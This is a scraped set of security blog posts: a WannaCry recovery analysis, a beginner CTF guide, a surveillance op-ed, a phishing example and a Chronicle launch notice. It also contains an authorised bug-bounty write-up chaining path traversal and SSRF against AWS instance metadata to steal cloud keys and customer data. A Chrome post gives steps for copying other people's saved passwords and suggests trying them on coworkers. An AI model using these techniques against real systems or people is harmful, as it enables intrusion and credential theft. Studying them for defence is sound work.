Now the malware will enumerate all interesting files based on their extension. If the original file size is less than 209,715,200 bytes, or a configurable limit of files is not yet reached, then the malware will use the demo RSA public key, which is hardcoded in the malware. For this key the private key is actually known and can be used to decrypt the content. For all the other files the victim’s RSA public key, for which the private key has been securely encrypted and stored locally, will be used.
This means the ransomware now generates a new 16-byte symmetric key using the CryptGenRandom API for each file it wants to encrypt. This symmetric key is encrypted using one of the available RSA public keys and stored together with a copy of the original file in encrypted form. The use of the demo key allows the attackers to decrypt a few files to prove that they are the actual authors. Unfortunately, this does not guarantee that they actually have the required RSA private key to decrypt the victim’s private key that was stored locally.
This explains why there have been claims that some tools are available to decrypt all the files locked by WannaCry. Unfortunately, from our analysis of how this ransomware works, it appears that only a few files encrypted with the demo key are decryptable by the tool.
But there might be some hope. Files stored in Desktop, My Documents, or on any removable disks in the computer at the time of the infection are overwritten with randomly generated data and deleted. This means it is not possible to recover them with a file undelete or disk recovery tool.
However, due to possible weaknesses in the malware it is possible to recover other encrypted files on the system when they were stored outside of these three locations, using an undelete of disk recovery tool, as most of the files are moved to a temporary folder and then normally deleted, without being overwritten by a wiper. However, the recovery ratio may vary from system to system because the deleted file may be overwritten by other disk operations.
In short, it should be possible to recover some of the files that have been encrypted with WannaCrypt without paying the ransom, however, the recovery of all files without a backup does not seem possible at the present time.
As a security note, be wary of any services offering to decrypt all files etc…, as these decryptors could very well be malware in disguise.
We have verified the file recoverability with a disk recovery tool named Disk Drill, the screenshot below shows the deleted files being discovered and recovered by this tool:
Computers running exceptionally old versions of XP may actually be able to generate a decryption key. This is due to a flaw that exists in Windows XP versions SP1 and SP2, and which was patched way back in 2008 in Windows XP SP3, so the percentage of computers still running those versions of the operating system is tiny.
However, those that do still have computers running those systems could exploit a flaw in its pseudo-random number generator (PRNG) that allows someone to predict encryption keys that would be created in the future and, crucially, reveal keys that had been generated in the past.
An individual could exploit this flaw to reveal the decryption key in memory if the malware is still running, and hence free their files from the grip of WannaCry.
UPDATE: Researcher Adrien Guinet has used a different XP flaw to recover keys from memory: https://github.com/aguinet/wannakey
There are claims that the same technique also works on Windows 7. However in our original analysis we determined that would only work in a laboratory setting, for example where:
- few files are encrypted
- the tool is already available for execution
- the tool is executed immediately post infection
The tool is searching memory for key components however in multiple tests we found that these key components were overwritten.
Despite these limitations, there are no negative side-effects for victims who wish to try out the tool.
Symantec’s investigations into the WannaCry ransomware are continuing. Keep an eye on the Threat Intel Twitter account for up-to-the-minute updates, and visit the Security Response blog for more information on this threat.
Written by
","['KNOWLEDGE', 'CAREERS', 'HISTORY OF...', 'DEEP DIVES', 'ARCHIVE', 'SYMANTEC BLOG', 'Security', 'Tech', 'Infosec', 'Cybersecurity', 'Deep Dive']"
Capture The Flag (CTF ) - Code Like A Girl,https://code.likeagirl.io/ctf-beginner-guide-by-a-beginner-3c86e4959fcc?source=tag_archive---------2-----------------------,"While beginning my collegiate career I was looking for opportunities to expand my personal life and learn more about digital security.
Digital security branches onto forensics analyst, penetration tester, network security, incident responder and so on. At first it was a little intimidating as the security field is so vast and I couldn’t easily narrow down my interest and figure out a good starting point. CTFing or “Capture The Flag” was an area of interest I decided to explore and used that as my guide in figuring out what my end goal was in terms of security.
Other than the fun that comes from CTFing and breaking into things (legally), you should have an understanding of the importance of security and why all of this stuff seriously matters. As we all know the world heavily depends on technology as we use it for numerous reasons: entertainment, emailing, transferring data, and so on. Along with this presents potential risks in digital security and any private information stored is vulnerable to digital threats which is why it’s important to be alert, know when to take course of action and protect yourself.
One good way to learn how to protect yourself is by doing CTFs which is a tool for people to learn and obtain skills similar to what hackers use in real-life situations and obtain a greater depth of understanding on vulnerabilities. There are two different types of CTF’s, Jeopardy style and Attack-Defense. Jeopardy style is just how the jeopardy game is played out with a board of categories that includes reverse engineering and pwn to forensics and web exploitation. I haven’t participated in any attack-defense challenges so the guide will be focused around jeopardy style CTFs.
I have been incessantly playing in CTFs for the past couple of weeks and during the process I have learned many security tools and vulnerabilities that I will be sharing from a perspective of an absolute beginner and share knowledge that I have found necessary to understand that has helped me succeed thus far. I believe one of the benefits of reading a guide from the viewpoint of a beginner is that I avoid overestimating what the audience actually knows and no process is overlooked (provided with resources) and will try my best to well-equip the reader with the required skills to start CTFing.
When I just started doing CTFs and researched ways to improve, many guides out there cover far too much information that was beyond my comprehension and assumed the beginners level of understanding. This article is not written for a cyber-security mastermind or a leet hacker. The intention of this article is to help you get somewhat more familiar with doing simple CTFs, navigating through the terminal, and so on. This will be done mainly by explaining some of this material based on experience combined with providing links and resources that I’ve found personally helpful.
Disclaimer!! Since there are many categories of CTF challenges out there I will be mainly focusing on reverse engineering primarily because 90% of the CTFs I did and the tools I used are geared towards solving RE challenges and is what I am currently interested in.
Focusing on one category and sticking with it is good practice for improving the special skill set required to attempt those challenges and encourages you to continuously challenge yourself. Something important that I learned during this experience is that you don’t need to become a jack of all trades and feel pressured to know how to solve challenges of every single category. Find one CTF category that you enjoy and stick with it. Branching out happens later as you’re becoming more comfortable with this kind of stuff. With this article I hope that the reader will be prepared to start and do CTFs. This is something that can be intimidating at first for beginners but once you’ve gotten past some of the basics it will get easier from that point.
Seriously, keep at it and you’ll get better. The “trick” is you have to actually do it yourself.
When testing/learning how to use offensive security tools it’s important to set up a safe zone when exploiting vulnerabilities and take certain security precautions into consideration. When building your lab environment it’s recommended you accommodate enough space and resources depending on your goal. Some people use Virtual Machines to develop software for other platforms, test malware or maybe they prefer a certain OS over their host machine’s OS. If you have a virtualizer you can skip this step.
I will be guiding you on installing a VM and provide links for the OS (reason mentioned below). Linux is by far the best Operating System for CTFing, programming and testing software. It provides the user with a lot of flexibility and freedom to do what they please. The Linux platform also has many useful tools available for the user that can be installed through the terminal. Honestly, I just feel better when I program on Linux and programming feels easier — Just my opinion though.
You can choose any lab, (Oracle VirtualBox, VMware Workstation, VMware Fusion..), personally use VirtualBox. Follow this link to begin the installation process. https://www.virtualbox.org/wiki/Downloads
Once you’re at a page that looks like this, download the package based on the OS running on your host machine. Once the installation wizard pops up, leave the default options checked (unless you want to update your file path) and continue to hit next. After you completed the process and exit the installation wizard, you should now have the VirtualBox Manager up and running.
If not, locate which path the files have been stored and open the application. (Note: on the left panel I have multiple workstations, if you just installed this it should be empty.). Now that you have your virtualizer installed, leave the manager open as you are going to have to install the Linux OS to attach to your new VM. Navigate to this website —
https://www.ubuntu.com/download/desktop?
You can install the latest version, 18.04 LTS ISO, I am currently running an outdated version, 16.04, but either will be fine. An ISO disk is what you will attach to your VM (image below) by replacing the “empty” drive and what holds the OS.
Considering that I’m striving for brevity and efficiency with this guide and shortening areas that are not directly related to CTFs, I just demonstrated the processes of instructing and installing a virtualizer as it’s a fast operation, setting up the OS requires a few more steps in which I HIGHLY recommend you check out this link and completing the required steps before moving on —
Before GUI (Graphical User Interface) was a thing, users had to navigate, manipulate and access files through the terminal by memorizing countless commands. However, there are still advantages to using the terminal over GUIs that is beneficial towards both the software and security sides of things.
Operations and process can be much faster to do through the terminal: unzipping or compressing files, finding information on files, installing software or security tools and applying them, writing bash scripts (Bash is a scripting language and is run on Linux), and the list goes on. Knowing how to use the terminal also avoids having to re-learn tools and services on GUI’s as they are continuously getting updated.
You are going to be solving CTF challenges using the terminal 90% of the time so in order to actually improve on doing CTFs or anything security related you have to actually sit down and familiarize yourself with the basic commands of using and navigating through your terminal. This will make the learning process tremendously easier allowing you to directly focus on what’s going on during the challenge. You’ll save yourself plenty of time, get through challenges faster and as a result learn more which is why before you continue on with this guide I highly recommend you visit this website and review the command line crash course—
“Shut Up and Shell” — Zed Shaw
For every challenge I start I’m either using one or all of these commands in the terminal from the start in learning more about the executable/file and trying to extract as much information as I can.
I will be explaining what each of these commands mean, and give examples of each execution so you can get the general idea of their purpose. During the reading, try to replicate what I am showing you on your own so the next time you start a challenge using these commands will come naturally to you.
You can find most of the CTFs that I use for demonstrative purposes at —
What I have here is an example CTF challenge (ex1). (Note: considering I provided the resources for you to learn basic terminal commands, I am going to assume you know what “ls” is.). Notice when we type in the command line(ls -lh) we are able to see the permissions of this file. Rwx means (r: read, w: write, x: execute), if there is a “-” that means the user doesn’t have permission to do either of the following. The permissions are broken into groups of three, giving permissions (in this order) to Owner, Group, and World. If we would like to execute this file we would have to use a command called “chmod” and the “+x” that converts that file into an executable. If you notice after, if we type “ls -lh” we are able to see “x” in each of the following groups. For additional information on chmod and what you can do with it, type into the terminal “man chmod” and you’ll be directed to chmod’s manual page. A neat thing to notice is that the file will be highlighted in green once you changed the file permissions(refer to image).
In this example, when we try to run the file “order” it says
We know how to fix this, simple chmod +x command. Before we start running this file, another helpful command is “file <filename>”, it will tell us which format this file is written in, the instruction set and whether it’s a 32-bit or 64-bit file. In our example, the file is a 64-bit ELF using x86 instruction set. If it was a 32-bit file we would have to “sudo apt-get install gcc-multilib” in order to execute it (Note: Windows subsystem doesn’t support gcc-multilib, run 32-bit on a VM). Using the file command can tell us other information such as if the file is and how it was compressed, if it’s an image file or ASCII file and so on.
Now let’s run the program. Type in the command “./order” and you should see something like this:
Another command to know is “strings <filename>”, it shows what text can be extracted from the file and is a great tool for doing static analysis. When typed the output appears as such…
If you want to specify what gets outputted you can check out the man page for strings, “man strings”. Sometimes the flag will be given by simply using the strings command or maybe there will be a string in base64 that you could use the terminal to decode for you. You can detect if the string is in base64 when the ending character is an “=” such as “CBwbGVhc3VyZS4=”. This comes up often when doing CTFs and using these commands to decode will come in handy. (shown below)
I highly recommend you familiarize yourself with Piping “|” and grep. Piping is a redirection tool that you can use to combine commands into one line (as shown in base64 decode example) and grep(extremely powerful) that’s used mainly to help with searching and filtering.
A must have when doing reverse engineering is a debugger/disassembler(IDA,Immunity, etc.). Stepping through the disassembled code and tracing through it can show what exactly is going on in each step and help in figuring out how to break into the program (the code will be broken down in assembly code). Deciding which debugger/disassembler to use and why depends on the user and your level of experience. This website gives you the list of debuggers to choose from and compares the differences among them — https://ctf101.org/reverse-engineering/what-are-disassemblers/#disassemblers
To get better at reading through assembly code and using the mentioned RE tools, HackUCF has an excellent crash course video that explains what registers are and certain operations — https://www.youtube.com/watch?v=75gBFiFtAb8
More examples using source code to assembly — https://ctf101.org/reverse-engineering/what-is-assembly-machine-code/
In order to get better at reading assembly and using debuggers you have to actually start applying your skills and practicing this stuff than just reading about them.One offline CTF that I’ve been playing on is https://microcorruption.com/It’s one of the best CTFs for starters that’s designed to improve specifically your RE skills and help you build skills such as reading assembly, doing static analysis, and corrupting memory. I’ll be using one of the challenges from microcorruption as an example of a stack buffer overflow.
One of the most common vulnerabilities you’ll find is a Stack Buffer Overflow. Essentially the developer has created a program and hasn’t took into consideration all the possible inputs into a buffer and when the user has control over that input they have the power to input a size beyond the buffer’s bound and crash the program.
Here’s a small C program to demonstrate this.
The user’s input will be stored in argv[1] and then that string gets passed to a function called overflow. In the function overflow(), it creates a local buffer and stores that string into that local buffer. Note that the buffer size is 50, all the user would have to do in order to crash the program is to input a string larger than 50.
Microcorruption has a challenge called Cusco that demonstrates this through assembly.
The user is prompted to enter a password with a fixed size.(Note: Intel platform stores numbers in little endian format in which the LSB — “Least Significant Byte”comes first. Mentioned in resource from video link.). I entered a test password “FFFFFFFFFF” and traced through the debugger to see what’s going on.
In the main function it makes a call to <login> and from the login function it calls <test_password_valid> and essentially the function would return the value stored in r15 and test to see if that value is 0 with the jz command(4526) and if so would fail the password test. After hours of trying to manipulate the password so that the value in r15 doesn’t become zero, I just assumed that I had no control of what value r15 holds when that operation was taking place so I decided to take a different approach and try to enter a long password to cause an overflow. Note that the call to <unlock_door> in <login> has the address of #0x4466 and converting that value from hex to ASCII 44 66 => D F. After many trials of manipulating the input so that the return address will match <unlock_door>, I got the solution by typing 16 F’s with FD at the end and it unlocked the door! As mentioned before, following the instruction set we reverse the order since it’s little endian which is why at the end of the string DF was in reverse.
There is usually a CTF going on at least twice a week and you can participate wherever you are (depending on whose hosting the CTF). The website below is commonly used by “CTFers” in staying up to date with all the CTFs that are going on around the world. After every CTF people will sometimes upload write-ups to this website that basically goes through the process and explains how they solved a particular challenge.
Some additional resources that that go in-depth on many other CTF categories and worth checking out.
https://trailofbits.github.io/ctf/intro/http://captf.com/practice-ctf/
Selected these specific resources as I refer to them as I am CTFing and found them helpful in times of need.
Thanks for reading! :)
Twitter: https://twitter.com/_saladhamWebsite: http://saladham.com
Written by
","['Role Models', 'TechTalk', 'Q&A', 'Girls', 'Book Reviews', 'Programming', 'Ctfs', 'Security', 'Cybersecurity', 'Codelikeagirl']"
Casino Royale - Digital Resilience,https://digitalresilience.com/casino-royale-5e40b7e2ce3e?source=tag_archive---------3-----------------------,"With a week’s worth of acclimation, the repercussions of Donald Trump’s shock victory in the presidential election are becoming more clear. Thus far, it is the President-elect’s crippling lack of practical political experience that seems most relevant, coursing through every half-measure and false start of the new administration: the power struggles and purges, the botched transitioning, the clumsy foreign greetings — the cluelessness about the very basics of what the presidency requires, from staffing the West Wing to signing the right paperwork. As Team Trump begins to slowly emerge, the response from Washington’s policy experts has largely been one of subdued horror: are there any steady hands ready at the tiller?
Perhaps not. But for all of this enveloping concern, there is one presidential power to which Donald Trump might take rapidly, having been an avid pupil in the private sector: high-tech spying. For decades, Trump’s aggressive instincts have cohered in a troubling pattern of retribution against his perceived enemies. Up until now, such tactics have been decidedly old-school, with Trump’s technological expertise plateauing beyond claims that “I am a fan of the future, and cyber is the future.” But married to the unprecedented technological might of the executive branch as it stands today, Trump’s personality may be precisely the danger privacy advocates have been warning about: a dangerous, vindictive, and unstable demagogue in full control of the most technically sophisticated coercive apparatus in human history.
Taught by his cold fish father, real estate baron Fred Trump, and vicious Manhattan mentors, like McCarthyite mob lawyer Roy Cohn, Trump has always observed a brutal code: “fight back harder than they ever hit you.” And so he has. Private surveillance, poison pen letters, planted news stories, scurrilous press releases, $100 million countersuits — Trump’s willingness to use extraordinary and ethically dubious methods against his foes is a constant throughout his entire public career.
As a private citizen, Trump’s bullying tactics already extended to bizarre private investigations of the President of the United States. Whether in his shady use of a phalanx of bodyguards and private detectives to investigate and intimidate his enemies, in his eavesdropping on the employee telephone system of his private Mar-A-Lago resort, or in his aggressive use of non-disclosure agreements to muzzle irritants to both his personal and business dealings, the President-elect has already shown a hypersensitivity to criticism verging on paranoia — and a willingness to rebut such criticism with overwhelming force.
Such behavior is disturbing enough when exhibited by a failed casino mogul. But as of January, Donald Trump will be entrusted with the entirety of the American security state, astride the surveillance programs of the National Security Agency, the human and signals intelligence of the Pentagon and Central Intelligence Agency, the full law enforcement might of the Justice Department and Federal Bureau of Investigation, and, perhaps, the assassination program that implicates all of these agencies.
How then might we expect the new president to behave, now empowered with the unparalleled technological expertise of America’s shadow state?
The signs thus far are not promising. Over the past two decades, national security forces have radically expanded their surveillance programs, in an opaque and unconstitutional regimen nominally under the control of the president. Under the administrations of both George W. Bush and Barack Obama, the executive branch has ardently defended the constitutionality and necessity of these programs, to the point of aggressive legal action. In an eerie and ominous convergence, the groups most affected by this governmental targeting have also been targets of Trump’s derision — both during his presidential run, and in the course of his long public career.
This collision — of an out-of-control spying apparatus with a deeply insecure and spiteful bully — marks a frightening and fateful moment. The ascendance of Trump, who is reportedly obsessed with revenge and who at least one campaign surrogate claimed is keeping an “enemies list,” could spell serious danger for three groups particularly vital to the health of a liberal democracy:
Journalists. The editors of muckraking New York-based ’80s magazine Spy delighted in covering Trump, then at the height of his real estate spending spree, in a body of journalism that mixed cutting satire with serious investigative reporting. But it was the magazine’s favorite insulting description of Trump, as a “short-fingered vulgarian,” that provoked a bizarre series of responses from the tycoon to editor Graydon Carter, decades after the death of the magazine:
“He’ll send me pictures, tear sheets from magazines, and he did it as recently as [last] April. With a gold Sharpie, he’ll circle his fingers and in his handwriting say, ‘See, not so short.’”
Trump’s tangled dealings with journalists have, through most of his career, hewed to this strange, thin-skinned behavior. Whether planting false stories with the press about Princess Diana’s closeness to Trump, donning the false identity of Trump spokesman “John Barron” to provide self-aggrandizing comments to reporters, or using his tabloid connections to snap up the rights to potentially embarrassing stories, Trump has always tried to control how the press depicts him. From his mornings spent searching the newspapers for mention of his name, to the late nights spent raging at CNN, Trump’s media obsession might be mostly amusing, but for the dark turn it’s taken over the course of his campaign.
Trump’s capacity for rage against the press was a centerpiece of many of his rallies, in which he would direct the crowd’s ire towards the press pen, blaming the assembled reporters for “rigging” the election and lying about the truth. Scenes of violent, intimidating behavior against these journalists by the Trump faithful became commonplace; especially scary was Trump’s regular mockery by name of NBC News’s Katy Tur, who required police protection to leave at least one rally. Reports of anti-Semitic, sexist, and racial harassment against journalists, including threats left at the homes of reporters, are a chilling indication of how this anger is manifesting itself. Trump himself has repeatedly threatened lawsuits against outlets like the New York Times for reporting on him, while blacklisting media outlets he finds insufficiently servile.
Trump’s assumption of power comes at a parlous time for journalists. Under Obama, journalists like New York Times reporter James Risen and Fox News’s James Rosen faced the serious threat of criminal prosecution for their work. The secrecy and lack of transparency of the Obama and Bush administrations, enforced in such a manner, will likely feel very comfortable for Trump. But given Trump’s nearly-unhinged track record with the press, this behavior may be about to go off the rails. Every media outlet in the world will be focused on Trump, with no shortage of loose threads for them to tug on — and even the most mainstream of reporters are steeling themselves for legal challenges, eavesdropping, and government spying.
Whistleblowers. In 1990, financial analyst Marvin Roffman, an expert on the gambling industry, took a close look at Donald Trump’s new and extravagant Atlantic City casino, the Trump Mahal. He didn’t like what he saw: the casino was enormous, with an absurdly high number of hotel rooms, massive casino floor space, and astronomical weekly payroll. When asked by the Wall Street Journal, Roffman predicted that while the casino would be a record-setting success in its opening summer, but would not be financially sustainable in the long off-season.
A chagrined Donald Trump did not view Roffman’s projection as a mere business calculation. Trump contacted Roffman’s boss at financial firm Janney Montgomery Scott, demanding Roffman not only apologize, but that he publicly reverse himself to state that the Trump Mahal would be a financial success. When Roffman refused, he was fired — and warned to keep it quiet, if he ever wanted to work in the industry again.
Roffman was an analyst merely trying to do his job, freely giving his opinion — an opinion which, incidentally, proved prescient, as the Trump Mahal missed its first debt payment in the fall of 1990, the first domino in Trump’s near financial immolation. It didn’t matter — Trump was able to get to Roffman in brutal fashion, notwithstanding his later legal settlement with the analyst. For his own employees, Trump has made extensive use of binding non-disclosure agreements to muzzle them long after they leave his employ — a practice which he employed even against volunteers to his presidential campaign in the past year.
Such is Trump’s usual strategy in dealing with restive voices, to the public’s detriment. The assault on Roffman did not merely serve to discredit one critic of Trump’s — it also had a chilling effect on other analysts, in a vivid demonstration of what happens when you get on the mogul’s bad side. This ultimately damaged the ability of the investors and pension funds that put money into Trump Mahal’s operations to know the truth.
In such an atmosphere of secrecy and intimidation, whistleblowing may be the only way to learn of serious wrongdoing that affects the public interest. The anonymous submission of one of Donald Trump’s tax returns to the New York Times, which revealed the billionaire may have exploited loopholes to avoid paying millions to the IRS, is some of the only firm information the public possesses of Trump’s finances, given his unprecedented refusal to release his tax returns. Such whistleblowing must be encouraged and defended as vital to a healthy free press.
Unfortunately, Trump steps into office at a time when such whistleblowing is under serious assault by the federal government — even without Trump’s plan to make federal employees sign NDAs. While President Obama has paid lip service to the need to protect such whistleblowers, he has instead waged war on any to emerge from the federal government, such as Wikileaks source Chelsea Manning and former NSA contractor Edward Snowden. Unlike with his real estate hijinks, Trump may soon be able to jail anyone who blows the whistle on his dealings as president.
Activists. The revelation that hundreds of hate crimes have been committed in the aftermath of his election prompted Trump to turn to the 60 Minutes camera to implore his followers: “Stop it.” It was a muted shift from his violent rhetoric at campaign rallies over the past year, as he physically threatened protesters and incited his crowds against them, sometimes resulting in real assaults. Indeed, it was not a front Trump could maintain, later tweeting about his post-election protesters in a manner suggesting he was unfamiliar with the constitutional rights of assembly and free speech. Perhaps he isn’t — Trump’s career is marked by an almost pathological hatred of any protests of his activities.
Trump is said to fear humiliation more than anything else, which may explain his virulent disdain for any protesters who stand in the way of his stated goals. Whether his enemies are environmentalists, politicians, or real estate holdouts, Trump has a track record of rejecting any objections out-of-hand, no matter how costly the consequences. In Scotland, for instance, Trump ultimately succeeded in the construction of his Aberdeen golf course, destroying ancient sand dunes and fraying the delicate ecosystem of the area, but at the cost of incurring the hatred of all of Scotland. Likewise, though historical preservationists battled against his demolition of the Bonwit Teller building, Trump ultimately destroyed this architectural treasure to make way for his Trump Tower, reasoning that even removing the most remarkable artwork in the building would be too time-consuming and expensive.
Such high-handed behavior has carried over into his presidential campaign; Trump’s whining about Latino activists shutting down highways in protest of his xenophobic beliefs is a bad warning sign, if his prior behavior is any indication. The proliferation of non-violent protests in America, from the Occupy Wall Street to Black Lives Matter movements, has been met by a furious militarized police response, complete with technologically advanced tracking and identification of protesters, as well as the disruption of their communications. One of Trump’s closest advisors, ex-New York City Mayor Rudy Giuliani, has evinced an interest in a cybersecurity post in the administration — a portentous development, given Giuliani’s long history of anti-protest fundamentalism. Giving Trump the surveillance and police powers deployed in recent memory against protesters could lead to some frightening outcomes.
What then to do?
Use websites and tech companies that value your privacy. The disclosure that Yahoo had cooperated with the NSA in a massive spying effort against the company’s email users was a final insult to many users of and investors in the web portal. The effort, which was so secretive that Yahoo’s IT security employees initially thought it was a hack, followed the revelations of what may be the worst data breach in history, affecting hundreds of millions of email addresses.
The takeaway is simple — you probably shouldn’t use Yahoo, which can’t be trusted with your information, whether under siege from hackers or from the national security state. Look for websites that employ basic, smart cybersecurity measures, such as https encryption, and do business with tech companies unwilling to negotiate away your privacy; Apple’s refusal to provide the FBI with the means of breaking the San Bernardino shooter’s iPhone is a good start, though the tech giant is not without sin, either. When all else fails, you can also use heavy duty tools like Tor to anonymously use the internet; out of a maximum of 950, Tor’s website scores an impressive score of 805 in UpGuard’s CSTAR cyber risk analysis.
Encryption. As explained by The Intercept’s Micah Lee, both iPhones and Android phones can be securely encrypted by users, with long passcodes making it nearly impossible for any interlopers to access your information. For secure communications, end-to-end encryption programs like Whatsapp and Signal allow you to exchange information that will not be accessible in the transmission process — even to the app’s engineers themselves. Such apps also rate highly for their cybersecurity footing, WhatsApp scores a CSTAR score of 884, while Signal developer Whisper rates 789.
Use Common Sense. For all of the technological prowess of the American security apparatus, some of the simplest measures you can take to secure your information are steps that were a good idea long before Trump ever became president. Practice good password hygiene, using different, alphanumeric passwords for different sites, perhaps secured through a password manager. Be wary of social media requests from people you don’t know; if you are involved in activism, be likewise careful in disclosing your plans or identity on public-facing Facebook and Twitter pages. And when in doubt — communicate face to face, with no technology in the room! Sometimes, the old-fashioned ways are the best ones.
Whether you are a journalist, activist, potential whistleblower, or just a concerned citizen, there are some sensible technological precautions you can and should take to protect your cyber profile, from criminals and hackers as well as from the government — no matter who is president.
Written by
","['Politics', 'Surveillance', 'Donald Trump', 'Privacy', 'Cybersecurity']"
CEO to CFO phishing scams are on the rise. Here’s one we caught in the act.,https://medium.com/@valimail/ceo-to-cfo-phishing-scams-are-on-the-rise-here-s-one-we-caught-in-the-act-f6529643e890?source=tag_archive---------8-----------------------,"by Steve Whittle, ValiMail
There has been a lot of coverage in the media recently about spear phishing and the ‘CEO to CFO’ scam, and for good reason. Phishing attacks have been distressingly common for some time, and they appear to be getting worse. For a sampler, just check out security expert Brian Krebs’ many stories of executives being duped by fake emails.
These attacks rely on the scammers using your exact domain to create fake email messages that look like they originate from within your company. They can often get away with this because many email systems don’t verify whether the sender is actually authorized to use that domain or not.
DMARC, when in enforcement mode, stops this cold.
Just recently ValiMail saw an example of a spear phishing email sent to one of our customers. The CFO found it in her spam folder. As you can see below, the language is a bit stilted, so she probably could have identified it as a suspicious message if she was reading carefully. But it is easy to be fooled in the rush of daily activities. And anyway, do you want your CFO worrying about the authenticity of every email? Or do you want her focusing on the company’s finances?
Ditto for people in HR: The IRS recently warned payroll and HR departments to be alert for W2 scams, where the CEO appears to be sending a request for employees’ W2 tax forms, which the attackers then use in a variety of ways, such as filing fraudulent tax returns. But why should HR people be spending their time trying to establish the authenticity of emails they receive?
For our customer, there was never any question of being fooled, since DMARC caused it to go to the spam folder. But the fact that the CFO could see it at all (by looking through her spam folder) was enough to make the security team move to p=reject, which means that future messages that fail authentication like this will be deleted outright. (Note: for more on DMARC configuration and p=reject, see our DMARC FAQ.) There is now no chance at all that this company will be caught out by attackers spoofing their domains.
Happy Authenticating!
— — — — — Forwarded message — — — — — From: John Smith <ceo@company.com>To: <cfo@company.com>Cc: Date: Wed, 2 Mar 2016 08:25:03 -0800Subject: Att: JohnJohn Kindly confirm how soon you can initiate an urgent bank transfer today, let me know when you can so that i can send the beneficiary’s details.Regards, —  Jane Doe
— — — — — Forwarded message — — — — — From: John Smith <ceo@company.com>To: <cfo@company.com>Cc: Date: Wed, 2 Mar 2016 08:12:37 -0800Subject: Att: John
John
Confirm the receipt of this message if you are on seat , i want you toprocess a payment before cut off time today.
Regards, — Jane Doe
Written by
","['Cybersecurity', 'Phishing', 'Email']"
Chain of hacks leading to Database Compromise! - Avinash Jain (@logicbomb_1) - Medium,https://medium.com/@logicbomb_1/chain-of-hacks-leading-to-database-compromise-b2bc2b883915?source=tag_archive---------3-----------------------,"Hi Guys,This is yet another a security vulnerability writeup about one of my recent findings of a chain of security vulnerabilities that linked up to compromise one of the databases of India’s most profitable E-commerce company. Let’s see the complete story —
(This was done with the explicit permission of the concerned company)
This was supposed to be a targetted attack where I was specifically focussing on finding an LFI vulnerability (local file inclusion) so I was more keen on searching and exploring functionalities and endpoints which were related to some interaction with files and then I came across a usual functionality where application provides you with the options of “Android Google play” and “iPhone App store” to download their app.
and when I clicked on it, it redirected me to the following page with the following URL-
and then immediately redirected to the previously referred page and when I opened it in incognito window to see what’s the response when there is no referred page, it got redirected to “404 Page not found” so it was clear that it was looking for some condition and parameters and then following the simple if/else logic. To see if there were any parameters which got missing, I stumbled to look upon the HTML code of the page-
The logic as expected was very clear and the interesting thing which I noticed (as you can see in the red box), there was a php file “download_handler.php” which was missing in the URL which requires a parameter “path” as finaldownloadlink and “name” for the name of the URL and that’s the reason why nothing got downloaded. Let’s follow the above code, so the final URL came out to be —
where I simply tried directory traversal attack (../../../../etc/passwd) and to all my luck, files had the maximum permission given (a common mistake :/) and I was able to read /etc/passwd content and various other juicy files —
I was able to read various Linux system files, configuration, access logs which got me user access token coming in get params and much more sensitive information. The culprit of this complete loophole was the “download_handler.php” —
The php file was simply taking the file as an input and reading it back to the client. Could easily see it vulnerable to SSRF as well —
Tried reading the /etc/password using different URL schemas (file:/// , dict:// , ftp:// and gopher://) and was able to do the same using file:/// scheme —
Earlier, when I was grabbing sensitive files via LFI attack, I happened to read /etc/motd file which suggested that the application was deployed over AWS ElasticBeanstalk.
This message was sufficient for me to decide to go ahead and search for AWS Instance MetaData and User Data via SSRF —
I was also able to retrieve the AWS account ID and Region from the below API “http://169.254.169.254/latest/dynamic/instance-identity/document” —
When I was reading about AWS Elastic Beanstalk, I came across an API call which could fetch AWS Access Key, Secret Access Key, and Token.
I quickly made the call via SSRF and I was able to grab their AWS Access key, ID, token and earlier I got their account id too, and that was the moment when the vulnerability became more critical—
Now it’s time to authenticate into the AWS account. Just to make sure the credentials are not expired, I configured aws-cli and tried to list and download the S3 bucket data onto my local machine and I was able to do so —
Copying s3 bucket content to the local machine —
While reviewing each and every single S3 bucket, I found some critical files inside some buckets, there were files like database.js, config.js, app.js, payment.config files which quickly grabbed my attention and as I was expecting, they found to contain information like Payment hash key and salt (which could be used to tamper with the order’s payment), several database credentials, some internal tools username, and password and much more. There was also one MongoDB instance running whose credentials were also found to be lying in plain text in of the config files and when I tried connecting to it, I found their customer's data stored inside it —
Though it was not containing all the user details but it was as many as more than 10K. I reported the vulnerability soon after this and they were very quick to patch it and also rotated all of their affected credentials and keys. So having started from LFI, I reached to SSRF from where I came to know that the application was deployed over Elastic Beanstalk and from there I was able to grab one of the AWS accounts credentials which helped me to reach one of their Databases credentials which were lying in one S3 bucket over which I had complete read/write access and connecting to the database, I found thousands of customer’s details lying along with various other sensitive credentials/keys and information.
That’s it about this interesting finding!
Thanks for reading!
~Logicbomb ( https://twitter.com/logicbomb_1 )
Written by
","['Hacking', 'Information Security', 'Cybersecurity', 'Bug Bounty', 'Security']"
"Chrome Hacking : Steal saved passwords, form fields, bookmarks and history.",https://medium.com/secjuice/anyone-can-steal-all-of-chrome-saved-passwords-form-fields-bookmarks-history-ab2da3b4853e?source=tag_archive---------8-----------------------,"I have reported this to Google before I brought it to you, their response was disappointing and amounted to “Yes, given unrestricted access to a user’s account, you can steal data from it … Status:WontFix”.
You can try it with your friends at work or with anyone that gives you access to a computer… it’s really funny but dangerous and they really should fix it.
Lets Do It
Click the icon on the right corner or chrome://settings/manageProfile
Click on the Edit person or chrome://settings/people
Click SIGN IN TO CHROME
Use another gmail account with a known password (your gmail account)
Click next
Click continue
open any other computer
Sign in with your gmail accountbrowse to chrome://settings/?search=password
Now you have all their password under you google account without ever knowing what their password was and call me crazy, but that ain’t right.
Many thanks to Idan Slonimsky that was an integral part of the work that lead to this post, and for his help in reviewing it.
Editors Note: Put a WEBGAP between you and the malware with a browser isolation technology or by leveraging a remote browser service.
Written by
","['Opinion', 'OSINT', 'How To', 'Security', 'Chrome', 'Hacker', 'Cybersecurity', 'Technology']"
Chronicle: Can I Get The Backstory? - Chronicle Blog - Medium,https://medium.com/chronicle-blog/introducing-backstory-45dd9b4d4a6d?source=tag_archive---------3-----------------------,"Chronicle is launching Backstory today. In a nutshell, Backstory is the first global security telemetry platform designed for a world that thinks in petabytes. It’s a big milestone for us and one we hope will give enterprises a major leap over the current data storage and compute systems holding back their security.
Before going deeper into our new Backstory product, it’s first important to understand Chronicle’s own backstory to this point.
Just over a year ago we announced Chronicle, a new Alphabet company, focused entirely on enterprise cybersecurity. Our mission, Give Good the Advantage, is fueled by our ability to leverage significant resources to give security professionals an entirely new class of tools, perspectives, and abilities that aim to counter, and even leap ahead of, the capabilities of our antagonists.
